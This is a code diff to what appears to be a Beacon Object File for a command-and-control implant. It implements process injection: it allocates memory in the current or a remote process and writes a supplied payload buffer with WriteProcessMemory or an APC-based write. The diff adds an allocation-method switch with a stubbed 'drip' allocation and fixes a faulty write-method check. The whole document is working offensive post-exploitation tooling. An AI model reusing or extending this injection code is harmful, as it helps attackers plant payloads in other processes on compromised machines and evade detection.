@@ -9,8 +9,8 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
     ULONG ProcessID = BeaconDataInt( &Parser );
     INT32 Length    = 0; 
     CHAR* Buffer    = BeaconDataExtract( &Parser, &Length );
-
-    ULONG WriteMethod = BeaconDataInt( &Parser );
+    ULONG AllocMtd  = BeaconDataInt( &Parser );
+    ULONG WriteMtd  = BeaconDataInt( &Parser );
     
     PVOID  VmBase   = nullptr;
     HANDLE Handle   = nullptr;
@@ -19,9 +19,10 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
     BOOL   Success  = FALSE;
 
     if ( ProcessID == HandleToUlong( NtCurrentTeb()->ClientId.UniqueProcess ) ) {
-        VmBase = VirtualAlloc( nullptr, Length, MEM_COMMIT, PAGE_READWRITE );
-        if ( ! VmBase ) {
-            BeaconPrintf( CALLBACK_ERROR, "[x] Failure in memory allocation: %d\n", GetLastError() ); return;
+        if ( AllocMtd == Alloc::Default ) {
+            VmBase = VirtualAlloc( nullptr, Length, MEM_COMMIT, PAGE_READWRITE );
+        } else if ( AllocMtd == Alloc::Drip ) {
+            // VmBase = BeaconDripAlloc
         }
 
         Printf( "[+] Memory allocated with RW @ %p\n", VmBase );
@@ -44,17 +45,22 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
             BeaconPrintf( CALLBACK_ERROR, "[x] Failure to open target process handle: %d\n", GetLastError() ); return;
         }
 
-        VmBase = VirtualAllocEx( Handle, nullptr, Length, MEM_COMMIT, PAGE_READWRITE );
+        if ( AllocMtd == Alloc::Default ) {
+            VmBase = VirtualAllocEx( Handle, nullptr, Length, MEM_COMMIT, PAGE_READWRITE );
+        } else if ( AllocMtd == Alloc::Drip ) {
+            // VmBase = BeaconDripAlloc
+        }
+        
         if ( ! VmBase ) {
             BeaconPrintf( CALLBACK_ERROR, "[x] Failure in memory allocation: %d\n", GetLastError() ); return;
         }
 
-        if ( WriteMethod == Write::Default ) {
+        if ( WriteMtd == Write::Default ) {
             Success = WriteProcessMemory( Handle, VmBase, Buffer, Length, 0 );
             if ( ! Success ) {
                 BeaconPrintf( CALLBACK_ERROR, "[x] Failure in memory write: %d\n", GetLastError() ); return;
             }
-        } else if ( Write::Apc ) {
+        } else if ( WriteMtd == Write::Apc ) {
             Success = BeaconWriteApc( Handle, VmBase, Buffer, Length );
             if ( ! Success ) {
                 BeaconPrintf( CALLBACK_ERROR, "[x] Failure in memory write: %d\n", GetLastError() ); return;
